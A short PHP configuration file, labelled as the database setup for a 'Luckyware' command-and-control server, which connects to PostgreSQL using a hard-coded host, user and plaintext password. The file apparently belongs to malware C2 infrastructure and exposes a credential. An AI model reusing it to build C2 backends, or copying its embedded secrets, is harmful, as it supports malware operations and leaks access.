<?php
// Luckyware C&C Database Configuration
// PostgreSQL (Render Internal)
// Using Render PostgreSQL for perfect compatibility

$db_host = 'dpg-db0k1ifavr4c7382re2g-a';
$db_name = 'luckyware';
$db_user = 'luckyware_user';
$db_pass = 'SR5BqBJhHKOlYEjvn5ia71HFWRJtTIZ4';
$db_port = 5432;

// Create PDO connection
function getDB() {
    global $db_host, $db_name, $db_user, $db_pass, $db_port;
    try {
        $dsn = "pgsql:host=$db_host;port=$db_port;dbname=$db_name";
        $pdo = new PDO($dsn, $db_user, $db_pass);
        $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
        return $pdo;
    } catch(PDOException $e) {
        die("Database connection failed: " . $e->getMessage());
    }
}
?>
